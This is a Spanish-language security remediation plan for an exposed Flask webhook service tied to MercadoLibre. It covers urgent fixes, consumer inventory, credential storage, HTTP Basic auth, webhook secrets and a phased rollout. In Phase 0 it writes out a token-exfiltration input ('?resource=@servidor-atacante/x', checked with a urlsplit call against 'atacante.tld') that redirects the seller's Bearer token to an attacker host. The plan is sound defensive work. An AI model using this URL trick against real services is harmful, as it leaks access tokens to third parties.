# Plan de autenticación de ml-webhook

Estado actual: **la app no tiene ningún control de acceso.** 24 rutas activas expuestas en internet, 4 de ellas escriben precios reales en MercadoLibre, y una entrega el access token del vendedor a un servidor arbitrario.

No se puede activar autenticación de un día para el otro porque hay aplicaciones externas consumiendo estos endpoints y **no sabemos cuáles son todas**. Este plan resuelve eso sin cortarles el servicio.

---

## Principio rector

**El orden lo dicta el radio de explosión, no la severidad.**

La reacción intuitiva es empezar por lo más grave. Es la equivocada: lo más grave suele ser también lo más usado, y activarle autenticación sin aviso deja a todos afuera.

El orden correcto es: primero lo que se arregla **sin credenciales** (no rompe a nadie), después lo que tiene **un solo consumidor conocido**, y al final lo que tiene consumidores desconocidos —recién cuando dejaron de ser desconocidos.

---

## Fase 0 — Cerrar hoy, sin coordinar con nadie

Estos arreglos no necesitan credenciales ni avisar a ningún consumidor. Son cambios de código que no alteran ninguna llamada legítima.

| Qué | Dónde | Cambio |
|---|---|---|
| Exfiltración del token | `app.py:1922` | Validar `resource` contra una allowlist de prefijos antes de concatenar. Rechazar todo lo que no empiece con `/` |
| Misma exfiltración, otra puerta | `app.py:996` | Igual validación en `fetch_and_store_preview` |
| DoS del sweep | `app.py:3656` | Pasar a `POST`, eliminar `?force=1`, mover el `t.start()` dentro del lock |
| Sobrescritura del token | `app.py:1574` | Validar el parámetro `state` generado en `/auth` |
| Token en logs | `app.py:1591` | Eliminar el `print` del `token_data` |

**La validación de `resource` es la más urgente de todas.** Hoy `?resource=@servidor-atacante/x` hace que el header `Authorization: Bearer <token>` salga hacia el servidor del atacante. Verificado: `urlsplit("https://api.mercadolibre.com@atacante.tld/x").hostname == "atacante.tld"`.

Ningún consumidor legítimo manda un `resource` que no empiece con `/`. La allowlist no rompe nada.

---

## Fase 1 — Inventario de consumidores (modo observación)

**No se le puede exigir credenciales a un consumidor que no sabés que existe.**

Middleware `before_request` que **no rechaza nada** y registra por cada request:

- ruta, método, status de respuesta
- IP de origen y `User-Agent`
- si trajo credencial y, en caso afirmativo, cuál

Dos semanas de datos producen el inventario real: quién llama, a qué, con qué frecuencia. Sin eso, cualquier activación es a ciegas.

Salida esperada: una lista de consumidores con nombre, contacto y rutas que usa. Los que no se puedan identificar por IP o `User-Agent` se identifican cortándoles el servicio en una ventana anunciada y viendo quién reclama — **último recurso, no primera opción**.

---

## Fase 2 — Dónde viven las credenciales

### Decisión: base de datos, no `.env`

| | `.env` | Base de datos |
|---|---|---|
| Alta de un consumidor | requiere deploy | `INSERT` |
| Rotación de secreto | requiere deploy | `UPDATE` |
| Revocación inmediata | requiere deploy | `UPDATE` |
| Scopes por consumidor | parseo a mano | columna |
| Saber si alguien sigue usando la credencial | no se puede | `last_seen_at` |
| Funciona con la base caída | sí | no |

El `.env` pierde en todo salvo en la última fila, y esa se mitiga. La razón de fondo: **una credencial que solo se puede revocar con un deploy no se revoca a las 3 de la mañana.**

### Mitigaciones de las dos desventajas

**Latencia**: caché en memoria con TTL de 60 segundos. La base no queda en el camino crítico de cada request. Costo: una revocación tarda hasta 60 segundos en hacerse efectiva. Es aceptable y hay que documentarlo, no descubrirlo.

**Base caída**: una credencial de emergencia en `.env` (`BREAK_GLASS_KEY`), con scope total, marcada como tal en el código. Se rota después de cada uso. Existe para el incidente, no para la operación.

### Esquema

```sql
CREATE TABLE api_clients (
    id            SERIAL PRIMARY KEY,
    name          TEXT NOT NULL UNIQUE,        -- 'pricing-app', 'panel-deposito'
    key_id        TEXT NOT NULL UNIQUE,        -- publico, viaja en claro
    secret_hash   TEXT NOT NULL,               -- bcrypt. NUNCA el secreto en claro
    scopes        TEXT[] NOT NULL DEFAULT '{}',
    enabled       BOOLEAN NOT NULL DEFAULT TRUE,
    enforce_from  TIMESTAMPTZ,                 -- NULL = todavia en periodo de gracia
    last_seen_at  TIMESTAMPTZ,
    created_at    TIMESTAMPTZ NOT NULL DEFAULT NOW(),
    revoked_at    TIMESTAMPTZ,
    notes         TEXT
);
```

**El secreto se muestra una sola vez, al crearlo.** En la base solo vive el hash. Si se pierde, se rota; no se recupera. Un sistema que puede mostrarte el secreto después es un sistema que también se lo puede mostrar a otro.

### Scopes

Por grupo funcional, no por recurso individual:

`pxq:read` · `pxq:write` · `promos:read` · `promos:write` · `webhooks:read` · `ml:render` · `admin`

`ml:render` se otorga con criterio restrictivo aun después de la Fase 0: sigue siendo un proxy de lectura amplio hacia datos de compradores.

---

## Fase 3 — Qué viaja en el cable

### La pregunta concreta: ¿pueden agregar `user:pass` a la misma URL?

**Sí, con HTTP Basic.** Y conviene, porque hace la migración barata: el consumidor no reescribe su cliente, agrega un parámetro.

Pero hay una distinción que importa:

```bash
# CORRECTO — curl arma el header Authorization: Basic <base64>
curl -u key_id:secret https://ml-webhook.gaussonline.com.ar/api/pxq/item/MLA123

# FUNCIONA IGUAL, PERO NO — el secreto queda escrito en varios lados
curl https://key_id:secret@ml-webhook.gaussonline.com.ar/api/pxq/item/MLA123
```

Las dos producen exactamente la misma request HTTP. La diferencia es **dónde queda registrado el secreto**: la segunda lo deja en el access log del servidor, en el historial del shell, en el `Referer` si hay navegación, y en cualquier proxy intermedio.

Se aceptan las dos formas —romper la segunda sería romper consumidores—, se documenta la primera, y **el servidor no debe loguear nunca la URL completa con credenciales**.

### Alternativa para clientes que no manejan Basic

```
X-API-Key: <key_id>.<secret>
```

Equivalente en seguridad sobre TLS. Se soporta como segunda opción.

### Lo que no se hace

**Credencial en query string.** Queda en todos los logs, en el `Referer`, y en el historial del navegador. No se ofrece ni como compatibilidad.

### Detalle a verificar antes

La app ya usa el header `Authorization` para **salir** hacia ML. Entrante hoy no se lee, así que el nombre está libre. Confirmar que ningún proxy o CDN intermedio lo consuma o lo reescriba antes de que llegue a Flask.

---

## Fase 4 — El caso especial: `/webhook`

**MercadoLibre no puede mandar headers de autenticación.** Se configura una URL y ML postea ahí. No hay lugar donde poner una credencial.

| Opción | Evaluación |
|---|---|
| Secreto en el path: `/webhook/<token-aleatorio-largo>` | Es un bearer token disfrazado de URL. Queda en logs del servidor, pero no es adivinable. Enfoque estándar para webhooks de terceros |
| Allowlist de IPs de ML | Frágil: ML no garantiza rangos estables. Se rompe sin aviso |
| Validación de firma | **No verificado**: hay que confirmar si ML firma las notificaciones. Si lo hace, es la mejor opción y reemplaza a las otras dos |

**Recomendación provisoria**: secreto en el path ahora, y verificar la firma antes de dar el tema por cerrado.

Transición sin pérdida de notificaciones: se levanta el path nuevo **procesando igual que el viejo**, se reconfigura la URL en ML, se verifica que el tráfico migró, y recién ahí se apaga el viejo. Nunca responder 200 sin procesar: ML da la notificación por entregada y no reintenta.

---

## Fase 5 — Activación, por radio de explosión

| Orden | Grupo | Consumidores | Riesgo de romper |
|---|---|---|---|
| 1 | Escrituras: `POST /api/pxq/*`, `POST`/`DELETE /api/promociones/*`, `/admin/*` | Probablemente solo pricing-app | **Bajo** — se coordina con un equipo |
| 2 | Lecturas de negocio: `/api/pxq/*` GET, `/api/promociones` GET, `/api/webhooks` | Desconocidos | Alto — requiere el inventario de Fase 1 |
| 3 | `/webhook` | MercadoLibre | Medio — cambio de un campo en ML, coordinado |
| 4 | Páginas HTML: `/consulta`, `/seller`, `/catalog*` | Personas | Bajo — Basic funciona nativo en el navegador |

**Las escrituras van primero.** Son las de mayor severidad **y** las de menor cantidad de consumidores. Es el único punto del plan donde lo más grave coincide con lo más fácil de cerrar, y hay que aprovecharlo: no requiere esperar las dos semanas de inventario.

La activación **no es global**. Cada consumidor tiene su `enforce_from`, y cada grupo de rutas se activa por separado. Activar todo junto es garantizar una caída.

---

## Fase 6 — Interruptores

| Control | Alcance | Para qué |
|---|---|---|
| `AUTH_ENFORCE=off\|observe\|on` | Global | Apagar todo si algo explota fuera de horario |
| `api_clients.enforce_from IS NULL` | Por consumidor | Mantener a uno en gracia mientras el resto ya está exigido |
| Contador de requests sin credencial por ruta | Por ruta | **Criterio de activación**: no se exige una ruta hasta que ese contador llega a cero |

Ese último es el que evita adivinar. Si después de repartir credenciales sigue habiendo tráfico anónimo en una ruta, es que quedó un consumidor sin migrar. Activar ahí es cortarle el servicio a alguien que no sabemos quién es.

---

## Lo que este plan NO resuelve

- **XSS reflejado** en 6 puntos con reflexión directa de query params. Es independiente de la autenticación y va en su propio trabajo.
- **Autorización a nivel de recurso** (qué publicación puede tocar cada consumidor). Los scopes son por grupo funcional. Suficiente por ahora; si aparece un consumidor que solo debe tocar un subconjunto de publicaciones, se replantea.
- **Rate limiting por consumidor.** Recomendado junto con la Fase 2, no bloqueante para el resto.

---

## Riesgos del plan

**La Fase 1 deja la app abierta dos semanas más.** Es la razón por la que la Fase 0 va primero y no depende de nadie: la exfiltración del token y el DoS se tapan hoy, sin esperar el inventario.

**La caché de 60 segundos.** Una credencial revocada sigue siendo válida hasta un minuto. Aceptado y documentado. Para una revocación inmediata: `AUTH_ENFORCE` global o reinicio del proceso.

**El inventario puede quedar incompleto.** Un consumidor que llama una vez por mes no aparece en dos semanas de observación. Por eso la Fase 5 se apoya en el contador por ruta y no en la lista de la Fase 1: la lista dice a quién avisar, el contador dice cuándo es seguro activar.

---

## Checklist de ejecución

- [ ] Fase 0 completa y deployada (no requiere coordinación)
- [ ] Middleware de observación activo
- [ ] Dos semanas de datos recolectados
- [ ] Inventario de consumidores con nombre y contacto
- [ ] Tabla `api_clients` creada, con caché y break-glass
- [ ] Credenciales emitidas a pricing-app
- [ ] Grupo 1 (escrituras) exigido
- [ ] Credenciales emitidas al resto de los consumidores identificados
- [ ] Contador de anónimos en cero por ruta antes de cada activación
- [ ] Grupos 2, 3 y 4 exigidos
- [ ] `/debug/token` y `/debug/dbinfo` eliminados definitivamente, no solo comentados
